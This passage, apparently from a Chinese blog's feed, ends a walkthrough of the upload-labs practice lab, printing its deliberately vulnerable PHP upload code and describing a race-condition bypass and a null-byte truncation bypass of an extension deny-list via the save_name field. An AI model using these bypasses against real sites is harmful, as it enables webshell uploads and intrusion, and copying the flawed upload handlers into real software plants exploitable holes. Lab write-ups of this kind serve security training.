class="hljs-string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;      <br>        <span class="hljs-keyword">default</span>:<br>            $msg = <span class="hljs-string">&#x27;未知错误！&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//myupload.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyUpload</span></span>&#123;<br>......<br>......<br>...... <br>  <span class="hljs-keyword">var</span> $cls_arr_ext_accepted = <span class="hljs-keyword">array</span>(<br>      <span class="hljs-string">&quot;.doc&quot;</span>, <span class="hljs-string">&quot;.xls&quot;</span>, <span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;.pdf&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>, <span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.zip&quot;</span>, <span class="hljs-string">&quot;.rar&quot;</span>, <span class="hljs-string">&quot;.7z&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,<br>      <span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&quot;.xml&quot;</span>, <span class="hljs-string">&quot;.tiff&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span> );<br><br>......<br>......<br>......  <br>  <span class="hljs-comment">/** upload()</span><br><span class="hljs-comment">   **</span><br><span class="hljs-comment">   ** Method to upload the file.</span><br><span class="hljs-comment">   ** This is the only method to call outside the class.</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@para</span> String name of directory we upload to</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@returns</span> void</span><br><span class="hljs-comment">  **/</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"> $dir </span>)</span>&#123;<br>    <br>    $ret = <span class="hljs-keyword">$this</span>-&gt;isUploadedFile();<br>    <br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;setDir( $dir );<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;checkExtension();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;checkSize();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>    &#125;<br>    <br>    <span class="hljs-comment">// if flag to check if the file exists is set to 1</span><br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">$this</span>-&gt;cls_file_exists == <span class="hljs-number">1</span> )&#123;<br>      <br>      $ret = <span class="hljs-keyword">$this</span>-&gt;checkFileExists();<br>      <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// if we are here, we are ready to move the file to destination</span><br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;move();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>    &#125;<br><br>    <span class="hljs-comment">// check if we need to rename the file</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">$this</span>-&gt;cls_rename_file == <span class="hljs-number">1</span> )&#123;<br>      $ret = <span class="hljs-keyword">$this</span>-&gt;renameFile();<br>      <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>      &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// if we are here, everything worked as planned :)</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-string">&quot;SUCCESS&quot;</span> );<br>  <br>  &#125;<br>......<br>......<br>...... <br>&#125;;<br><br><span class="hljs-number">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190619104159629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因此也存在条件竞争的问题，不过这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</p>
<p><img src="https://img-blog.csdnimg.cn/20190619120245814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619120306313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-19-00截断"><a href="#Pass-19-00截断" class="headerlink" title="Pass-19-00截断"></a>Pass-19-00截断</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        $file_name = $_POST[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .$file_name;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; <br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            $msg = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">1234567891011121314151617181920212223242526</span><br></code></pre></td></tr></table></figure>

<p>发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过，方法同pass-12</p>
<p><img src="https://img-blog.csdnimg.cn/2019061912220724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619122142117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20190619122230333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <tags>
        <tag>upload-labs</tag>
      </tags>
  </entry>
</search>
